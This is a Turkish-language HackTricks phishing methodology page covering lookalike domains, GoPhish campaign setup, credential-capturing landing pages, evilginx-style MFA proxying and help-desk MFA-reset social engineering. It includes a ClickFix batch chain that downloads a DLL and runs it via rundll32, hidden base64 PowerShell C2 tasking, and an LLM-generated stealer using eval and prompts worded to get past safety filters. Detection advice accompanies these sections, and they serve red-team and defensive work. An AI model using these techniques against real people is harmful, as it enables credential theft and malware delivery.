# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Kurbanı Recon et
1. **victim domain** seç.
2. Kurbanın kullandığı **login portals** için bazı temel web enumeration yap ve hangisini **impersonate** edeceğine **karar ver**.
3. E-postaları **bulmak** için biraz **OSINT** kullan.
2. Ortamı hazırla
1. phishing assessment için kullanacağın **domain**’i **satın al**
2. **Email service** ile ilgili kayıtları (SPF, DMARC, DKIM, rDNS) **configure** et
3. VPS’i **gophish** ile configure et
3. Kampanyayı hazırla
1. **email template** hazırla
2. credentials çalmak için **web page** hazırla
4. Kampanyayı başlat!

## Benzer domain names oluştur veya güvenilir bir domain satın al

### Domain Name Variation Techniques

- **Keyword**: Domain name, orijinal domainin önemli bir **keyword**’ünü **içerir** (örn. zelster.com-management.com).
- **hypened subdomain**: Bir subdomain’in **dot** karakterini **hyphen** ile değiştirir (örn. www-zelster.com).
- **New TLD**: Aynı domaini yeni bir **TLD** ile kullanır (örn. zelster.org)
- **Homoglyph**: Domain name içindeki bir harfi **benzer görünen harflerle** değiştirir (örn. zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** Domain name içindeki iki harfi **yer değiştirir** (örn. zelsetr.com).
- **Singularization/Pluralization**: Domain name’in sonuna “s” ekler veya kaldırır (örn. zeltsers.com).
- **Omission**: Domain name’deki harflerden birini **çıkarır** (örn. zelser.com).
- **Repetition:** Domain name’deki harflerden birini **tekrarlar** (örn. zeltsser.com).
- **Replacement**: Homoglyph gibi ama daha az stealthy. Domain name’deki harflerden birini, belki de klavyede orijinal harfin yakınındaki bir harfle değiştirir (örn, zektser.com).
- **Subdomained**: Domain name’in içine bir **dot** ekler (örn. ze.lster.com).
- **Insertion**: Domain name’e bir harf **ekler** (örn. zerltser.com).
- **Missing dot**: TLD’yi domain name’e ekler. (örn. zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Bellekte depolanan veya iletimde olan bazı bitlerden birinin, solar flares, cosmic rays veya hardware errors gibi çeşitli faktörler nedeniyle otomatik olarak flip olma ihtimali vardır.

Bu kavram **DNS requests** üzerinde uygulandığında, **DNS server** tarafından alınan domain’in başlangıçta istenen domain ile aynı olmaması mümkündür.

Örneğin, "windows.com" domain’inde tek bir bit değişikliği onu "windnws.com." haline getirebilir.

Saldırganlar, kurbanın domain’ine benzeyen birden fazla bit-flipping domain kaydederek bundan **faydalanabilir**. Amaçları, meşru kullanıcıları kendi altyapılarına yönlendirmektir.

Daha fazla bilgi için [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Güvenilir bir domain satın al

[https://www.expireddomains.net/](https://www.expireddomains.net) içinde kullanabileceğin bir expired domain arayabilirsin.\
Satın alacağın expired domain’in **zaten iyi bir SEO**’ya sahip olduğundan emin olmak için, şu yerlerde nasıl kategorize edildiğine bakabilirsin:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Email'leri keşfetme

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Daha fazla geçerli email address **keşfetmek** veya daha önce keşfettiklerini **doğrulamak** için, kurbanın smtp server’larında bunları brute-force edip edemediğini kontrol edebilirsin. [Email address doğrulama/keşfetme hakkında burada bilgi al](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Ayrıca, kullanıcılar maillerine erişmek için **herhangi bir web portal** kullanıyorsa, bunun **username brute force** açığına karşı savunmasız olup olmadığını kontrol etmeyi unutma; mümkünse bu açığı istismar et.

## Configuring GoPhish

### Installation

Bunu [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0) adresinden indirebilirsin.

İndirip `/opt/gophish` içine aç ve `/opt/gophish/gophish` çalıştır\
Çıktıda 3333 portundaki admin user için bir password verilecektir. Bu nedenle o porta eriş ve admin password’ünü değiştirmek için bu credentials’ı kullan. O portu local’e tünellemen gerekebilir:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Yapılandırma

**TLS certificate yapılandırması**

Bu adımdan önce, kullanacağınız **domaini zaten satın almış** olmalısınız ve bu domain **gophish** yapılandırdığınız **VPS’in IP adresine** **yönlendiriliyor** olmalıdır.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail yapılandırması**

Kuruluma başlayın: `apt-get install postfix`

Sonra domaini aşağıdaki dosyalara ekleyin:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Ayrıca /etc/postfix/main.cf içindeki aşağıdaki değişkenlerin değerlerini değiştirin**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Son olarak **`/etc/hostname`** ve **`/etc/mailname`** dosyalarını domain adınıza göre değiştirin ve **VPS'nizi yeniden başlatın.**

Şimdi, VPS'nin **ip address**ine işaret eden `mail.<domain>` için bir **DNS A record** ve `mail.<domain>`e işaret eden bir **DNS MX** record oluşturun

Şimdi bir email göndermeyi test edelim:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish configuration**

Gophish’in çalışmasını durdurun ve yapılandıralım.\
`/opt/gophish/config.json` dosyasını aşağıdaki şekilde değiştirin (https kullanımına dikkat edin):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**gophish service'ini yapılandırın**

gophish service'ini oluşturmak için, böylece otomatik olarak başlatılabilir ve bir service olarak yönetilebilir, `/etc/init.d/gophish` dosyasını aşağıdaki içerikle oluşturabilirsiniz:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Hizmeti yapılandırmayı tamamlayın ve bunu kontrol edin:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Mail server ve domain yapılandırma

### Bekle ve yasal görün

Bir domain ne kadar eskiyse, spam olarak yakalanma olasılığı o kadar düşüktür. Bu yüzden phishing assessment öncesinde mümkün olduğunca uzun süre beklemelisiniz (en az 1 hafta). Ayrıca, itibarı yüksek bir sektörle ilgili bir sayfa koyarsanız elde edilen itibar daha iyi olacaktır.

Bir hafta beklemeniz gerekse bile, şimdi her şeyi yapılandırmayı bitirebilirsiniz.

### Reverse DNS (rDNS) kaydını yapılandırın

VPS’in IP adresini domain adına çözen bir rDNS (PTR) kaydı ayarlayın.

### Sender Policy Framework (SPF) Kaydı

Yeni domain için bir SPF kaydı **yapılandırmalısınız**. SPF kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

SPF politikanızı oluşturmak için [https://www.spfwizard.net/](https://www.spfwizard.net) kullanabilirsiniz (VPS makinesinin IP adresini kullanın)

![Phishing domain için SPF kaydı oluşturmaya yönelik SPF Wizard formu](<../../images/image (1037).png>)

Bu, domain içindeki bir TXT kaydına eklenmesi gereken içeriktir:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Yeni domain için bir DMARC kaydı yapılandırmalısınız. DMARC kaydının ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Hostname `_dmarc.<domain>` adresine işaret eden yeni bir DNS TXT kaydı oluşturmanız gerekiyor ve içeriği şu şekilde olmalı:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Yeni domain için bir DKIM yapılandırmalısınız. DMARC record'unun ne olduğunu bilmiyorsanız [**bu sayfayı okuyun**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Bu tutorial şuna dayanmaktadır: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> DKIM key'in ürettiği her iki B64 değerini birleştirmeniz gerekir:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Email yapılandırma skorunuzu test edin

Bunu [https://www.mail-tester.com/](https://www.mail-tester.com) kullanarak yapabilirsiniz\
Sadece sayfaya gidin ve onların verdiği adrese bir email gönderin:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Ayrıca `check-auth@verifier.port25.com` adresine bir e-posta göndererek **e-posta yapılandırmanızı kontrol edebilir** ve **yanıtı okuyabilirsiniz** (bunun için **25** portunu **açmanız** ve e-postayı root olarak gönderirseniz yanıtı _/var/mail/root_ dosyasında görmeniz gerekir).\
Tüm testleri geçtiğinizden emin olun:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Ayrıca kontrolünüz altındaki bir Gmail’e **message** gönderebilir ve Gmail gelen kutunuzda **email’s headers** kısmını kontrol edebilirsiniz; `dkim=pass`, `Authentication-Results` header field içinde yer almalıdır.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Spamhouse Blacklistinden Kaldırma

[www.mail-tester.com](https://www.mail-tester.com) sayfası, alan adınızın spamhouse tarafından engellenip engellenmediğini size gösterebilir. Alan adınızı/IP’nizi kaldırmak için şu adrese talep gönderebilirsiniz: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Microsoft Blacklistinden Kaldırma

​​Alan adınızı/IP’nizi kaldırmak için [https://sender.office.com/](https://sender.office.com) adresinden talep gönderebilirsiniz.

## GoPhish Campaign Oluşturma ve Başlatma

### Sending Profile

- Gönderen profilini tanımlamak için bir **isim** belirleyin
- Phishing e-postalarını hangi hesaptan göndereceğinize karar verin. Öneriler: _noreply, support, servicedesk, salesforce..._
- Kullanıcı adı ve parola alanlarını boş bırakabilirsiniz, ancak Ignore Certificate Errors seçeneğini işaretlediğinizden emin olun

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Her şeyin çalıştığını test etmek için "**Send Test Email**" işlevini kullanmanız önerilir.\
> Testleri yaparken blacklist’e düşmemek için test e-postalarını **10min mail adreslerine** göndermenizi öneririm.

### Email Template

- Şablonu tanımlamak için bir **isim** belirleyin
- Ardından bir **subject** yazın (garip bir şey değil, normal bir e-postada okumayı bekleyeceğiniz bir şey olsun)
- "**Add Tracking Image**" seçeneğini işaretlediğinizden emin olun
- **Email template** yazın (aşağıdaki örnekteki gibi değişkenler kullanabilirsiniz):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Not: **e-postanın güvenilirliğini artırmak için**, müşteriden gelen bir e-postadaki bazı imzaları kullanmanız önerilir. Öneriler:

- **Var olmayan bir adrese** e-posta gönderin ve yanıtın herhangi bir imza içerip içermediğini kontrol edin.
- **info@ex.com**, **press@ex.com** veya **public@ex.com** gibi **public e-postaları** arayın, onlara bir e-posta gönderin ve yanıtı bekleyin.
- Bulunan **geçerli bir e-posta ile iletişime geçmeyi** deneyin ve yanıtı bekleyin

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> Email Template ayrıca göndermek için **dosya eklemenize** de izin verir. Ayrıca NTLM challenge'larını bazı özel hazırlanmış dosyalar/dokümanlar kullanarak çalmak isterseniz [bu sayfayı okuyun](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Bir **isim** yazın
- Web sayfasının **HTML kodunu yazın**. Web sayfalarını **import** edebileceğinizi unutmayın.
- **Capture Submitted Data** ve **Capture Passwords** işaretleyin
- Bir **redirection** ayarlayın

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Genellikle sayfanın HTML kodunu değiştirmeniz ve sonuçlardan hoşlanana kadar yerelde (belki bir Apache server kullanarak) **bazı testler yapmanız gerekir.** Sonra o HTML kodunu kutuya yazın.\
> HTML için **static resources** kullanmanız gerekiyorsa (belki bazı CSS ve JS sayfaları) bunları _**/opt/gophish/static/endpoint**_ içine kaydedebilir ve ardından _**/static/\<filename>**_ üzerinden erişebilirsiniz

> [!TIP]
> Redirection için kullanıcıları kurbanın **legit main web page**'ine yönlendirebilir veya örneğin onları _/static/migration.html_ adresine yönlendirebilir, 5 saniye boyunca bir **spinning wheel (**[**https://loading.io/**](https://loading.io)**)** koyup ardından işlemin başarılı olduğunu belirtebilirsiniz.

### Users & Groups

- Bir isim belirleyin
- **Veriyi import edin** (not: örnekteki template'i kullanmak için her kullanıcının firstname, last name ve email address bilgilerine ihtiyacınız var)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Son olarak, bir isim, email template, landing page, URL, sending profile ve grup seçerek bir campaign oluşturun. URL'nin kurbanlara gönderilecek link olduğunu unutmayın

**Sending Profile'ın, final phishing email'inin nasıl görüneceğini görmek için test e-postası göndermeye izin verdiğini** unutmayın:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> Test e-postalarını blacklist'e düşmemek için **10min mails adreslerine göndermenizi** öneririm.

Her şey hazır olduğunda, campaign'i başlatın!

## Website Cloning

Herhangi bir nedenle website'i clone etmek istiyorsanız aşağıdaki sayfayı kontrol edin:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Bazı phishing assessments'larda (özellikle Red Teams için) ayrıca **bir tür backdoor içeren dosyalar gönderme** isteğiniz olabilir (belki bir C2 veya sadece bir authentication tetikleyecek bir şey).\
Bazı örnekler için aşağıdaki sayfaya bakın:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

Önceki attack oldukça zekicedir; çünkü gerçek bir website'i taklit eder ve kullanıcının girdiği bilgileri toplarsınız. Ne yazık ki, kullanıcı doğru password'u girmediyse veya taklit ettiğiniz application 2FA ile yapılandırıldıysa, **bu bilgiler kandırılan kullanıcının yerine geçmenize izin vermez**.

İşte bu noktada [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) ve [**muraena**](https://github.com/muraenateam/muraena) gibi tools faydalıdır. Bu tool size MitM benzeri bir attack oluşturma imkânı verir. Temelde attack şu şekilde çalışır:

1. Gerçek web sayfasının **login** formunu taklit edersiniz.
2. Kullanıcı **credentials** bilgilerini fake sayfanıza **gönderir** ve tool bunları gerçek web sayfasına göndererek **credentials'ın çalışıp çalışmadığını kontrol eder**.
3. Account **2FA** ile yapılandırılmışsa, MitM sayfası bunu ister ve kullanıcı bunu **girdiğinde** tool bunu gerçek web sayfasına gönderir.
4. Kullanıcı authenticated olduktan sonra siz (attacker olarak) tool MitM yaparken gerçekleşen her etkileşimden **captured credentials, 2FA, cookie ve herhangi bir bilgiyi** elde etmiş olursunuz.

### Via VNC

Kurbanı orijinaliyle aynı görünüme sahip malicious bir sayfaya **göndermek** yerine, onu gerçek web page'e bağlı bir browser bulunan bir **VNC session**'a gönderirseniz ne olur? Ne yaptığını görebilir, password'u, kullanılan MFA'yı, cookie'leri çalabilirsiniz...\
Bunu [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC) ile yapabilirsiniz

## Detecting the detection

Elbette, yakalanıp yakalanmadığınızı anlamanın en iyi yollarından biri domain'inizi **blacklist'ler içinde aramaktır**. Listelenmiş görünüyorsa, domain'iniz somehow şüpheli olarak tespit edilmiştir.\
Domain'inizin herhangi bir blacklist'te görünüp görünmediğini kontrol etmenin kolay bir yolu [https://malwareworld.com/](https://malwareworld.com) kullanmaktır

Ancak, kurbanın **aktif olarak suspicious phishing activity arayıp aramadığını** anlamanın başka yolları da vardır; bunun açıklaması şurada yer alır:


{{#ref}}
detecting-phising.md
{{#endref}}

Kurbanın domain'ine **çok benzeyen bir domain satın alabilir** ve/veya sizin kontrolünüzde olan bir domainin **subdomain**'i için, kurbanın domain'inin **keyword**'ünü içeren bir **certificate** üretebilirsiniz. Eğer **kurban** bunlarla herhangi bir tür **DNS veya HTTP interaction** gerçekleştirirse, onun **aktif olarak** suspicious domain'leri aradığını anlarsınız ve çok stealth olmanız gerekir.

### Evaluate the phishing

Email'inizin spam folder'a düşüp düşmeyeceğini, bloklanıp bloklanmayacağını veya başarılı olup olmayacağını değerlendirmek için [**Phishious** ](https://github.com/Rices/Phishious)kullanın.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion set'ler giderek email lure'larını tamamen atlıyor ve MFA'yı aşmak için **doğrudan service-desk / identity-recovery workflow**'unu hedef alıyor. Attack tamamen "living-off-the-land" şeklindedir: operatör geçerli credentials'ı ele geçirdiğinde, yerleşik admin tooling ile pivot yapar – malware gerekmez.

### Attack flow
1. Kurbanı recon edin
* LinkedIn, data breach'ler, public GitHub vb. kaynaklardan kişisel ve corporate detayları toplayın.
* Yüksek değerli identity'leri (executives, IT, finance) belirleyin ve **tam help-desk process**'ini password / MFA reset için çıkarın.
2. Gerçek zamanlı social engineering
* Telefon, Teams veya chat ile help-desk'i, hedefi taklit ederek arayın (çoğu zaman **spoofed caller-ID** veya **cloned voice** kullanılır).
* Bilgiye dayalı doğrulamayı geçmek için önceden toplanmış PII'yi verin.
* Agent'ı **MFA secret'ını sıfırlamaya** veya kayıtlı bir mobile number üzerinde **SIM-swap** yapmaya ikna edin.
3. Erişim sonrası anlık actions (gerçek vakalarda ≤60 dk)
* Herhangi bir web SSO portal üzerinden foothold kurun.
* AD / AzureAD'yi built-in araçlarla enumerate edin (binary drop edilmez):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Ortamda zaten whitelist edilmiş **WMI**, **PsExec** veya meşru **RMM** agent'ları ile lateral movement yapın.

### Detection & Mitigation
* Help-desk identity recovery'yi **privileged operation** olarak ele alın – step-up auth ve manager approval zorunlu kılın.
* Şu durumlarda alarm üreten **Identity Threat Detection & Response (ITDR)** / **UEBA** kuralları dağıtın:
* MFA yöntemi değişti + yeni device / geo'dan authentication.
* Aynı principal'in hemen elevation'ı (user-→-admin).
* Help-desk çağrılarını kaydedin ve herhangi bir reset öncesinde **zaten kayıtlı bir numaraya geri arama** uygulayın.
* Yeni resetlenen account'ların yüksek-privilege token'ları otomatik olarak devralmaması için **Just-In-Time (JIT) / Privileged Access** uygulayın.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crew'lar yüksek touch operasyonların maliyetini, **search engines & ad networks**'ü delivery channel'a dönüştüren kitlesel attack'lerle dengeler.

1. **SEO poisoning / malvertising** `chromium-update[.]site` gibi fake bir sonucu search ads'te en üste taşır.
2. Kurban küçük bir **first-stage loader** indirir (çoğu zaman JS/HTA/ISO). Unit 42'nin gördüğü örnekler:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader browser cookie'lerini + credential DB'lerini exfiltrate eder, ardından **silent loader**'ı çeker; bu loader gerçek zamanlı olarak şunlardan hangisinin deploy edileceğine karar verir:
* RAT (örn. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Yeni kaydedilmiş domain'leri engelleyin ve **Advanced DNS / URL Filtering**'i *search-ads* üzerinde ve email'de uygulayın.
* Software kurulumunu imzalı MSI / Store packages ile sınırlandırın, policy ile `HTA`, `ISO`, `VBS` çalıştırılmasını engelleyin.
* Browser child process'lerinin installer açmasını izleyin:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* First-stage loader'lar tarafından sık kötüye kullanılan LOLBin'leri avlayın (örn. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: adım adım “fix” talimatları gösteren, kopyalanmış ulusal CERT advisory'si ve bir **Update** button'ı. Kurbanlara bir batch çalıştırmaları söylenir; bu batch bir DLL indirir ve onu `rundll32` ile çalıştırır.
* Gözlenen tipik batch zinciri:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` payload'ı `%TEMP%`'e bırakır, kısa bir bekleme network jitter'ını gizler, ardından `rundll32` exported entrypoint'i (`notepad`) çağırır.
* DLL host identity'sini beacon eder ve birkaç dakikada bir C2'yi yoklar. Remote tasking **base64-encoded PowerShell** olarak gelir; gizli ve policy bypass ile çalıştırılır:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* Bu, C2 esnekliğini korur (server DLL'yi güncellemeden görevleri değiştirebilir) ve console window'ları gizler. `rundll32.exe`'nin child process'i olarak `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` birlikte kullanımını arayın.
* Defenders, `...page.php?tynor=<COMPUTER>sss<USER>` biçimindeki HTTP(S) callback'leri ve DLL yüklemesinden sonra 5 dakikalık polling interval'lerini kontrol edebilir.

---

## AI-Enhanced Phishing Operations
Attacker'lar artık tamamen kişiselleştirilmiş lure'lar ve gerçek zamanlı etkileşim için **LLM & voice-clone APIs** zinciri kullanıyor.

| Layer | Threat actor tarafından örnek kullanım |
|-------|----------------------------------------|
|Automation|Randomize edilmiş wording ve tracking link'lerle >100 k email / SMS oluşturup gönderme.|
|Generative AI|Public M&A'lere, sosyal medyadaki iç şakalara referans veren *tek kullanımlık* email'ler üretme; callback scam'de deep-fake CEO voice.|
|Agentic AI|Domain'leri otonom olarak kaydetme, open-source intel toplama, kurban click yapıp credentials göndermediğinde sonraki aşama mail'lerini hazırlama.|

**Defence:**
• Güvenilmeyen automation'dan gelen mesajları vurgulayan **dynamic banners** ekleyin (ARC/DKIM anomalileri üzerinden).
• Yüksek riskli phone request'leri için **voice-biometric challenge phrase**'leri uygulayın.
• Awareness program'larında AI tarafından üretilen lure'ları sürekli simüle edin – statik template'ler artık geçersiz.

Credential phishing için agentic browsing abuse'a da bakın:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Secrets inventory ve detection için local CLI tools ve MCP'nin AI agent abuse'una da bakın:

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attacker'lar zararsız görünümlü HTML gönderebilir ve **runtime'da stealer üretebilir**; bunun için **trusted bir LLM API**'ye JavaScript sordurur, ardından bunu browser içinde çalıştırırlar (örn. `eval` veya dinamik `<script>`).

1. **Prompt-as-obfuscation:** exfil URL'lerini/Base64 string'lerini prompt içinde encode edin; safety filter'ları aşmak ve hallucination'ları azaltmak için wording'i yineleyin.
2. **Client-side API call:** load sırasında JS, public bir LLM'e (Gemini/DeepSeek/etc.) veya bir CDN proxy'ye çağrı yapar; statik HTML'de yalnızca prompt/API call bulunur.
3. **Assemble & exec:** response'u birleştirir ve çalıştırır (ziyarete göre polymorphic):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code personalises the lure (e.g., LogoKit token parsing) and posts creds to the prompt-hidden endpoint.

**Kaçınma özellikleri**
- Trafik iyi bilinen LLM domainlerine veya saygın CDN proxy’lerine gider; bazen bir backend’e WebSockets üzerinden.
- Statik payload yoktur; kötü amaçlı JS yalnızca render sonrası vardır.
- Deterministik olmayan üretimler, her oturum için **benzersiz** stealers üretir.

**Tespit fikirleri**
- JS etkin sandbox’lar çalıştırın; **LLM responses** kaynaklı runtime `eval`/dinamik script creation için işaretleyin.
- Front-end POST’larını LLM APIs’ine yapıp hemen ardından dönen text üzerinde `eval`/`Function` çalışanları avlayın.
- Client trafiğinde onaylanmamış LLM domain’leri ve ardından gelen credential POST’ları için alarm üretin.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Klasik push-bombing’e ek olarak, operatörler help-desk çağrısı sırasında doğrudan **yeni bir MFA registration’ı zorla** oluşturur ve kullanıcının mevcut token’ını etkisiz hale getirir. Sonraki herhangi bir login prompt’u kurbana meşru görünür.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
AzureAD/AWS/Okta eventlerini izleyin; aynı IP’den **`deleteMFA` + `addMFA`** olayları **dakikalar içinde** gerçekleşsin.



## Clipboard Hijacking / Pastejacking

Saldırganlar, ele geçirilmiş veya typosquatted bir web sayfasından kurbanın clipboard’una sessizce kötü amaçlı komutlar kopyalayabilir ve ardından kullanıcıyı bunları **Win + R**, **Win + X** ya da bir terminal penceresine yapıştırmaya kandırabilir; böylece herhangi bir download veya attachment olmadan keyfi code çalıştırılır.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
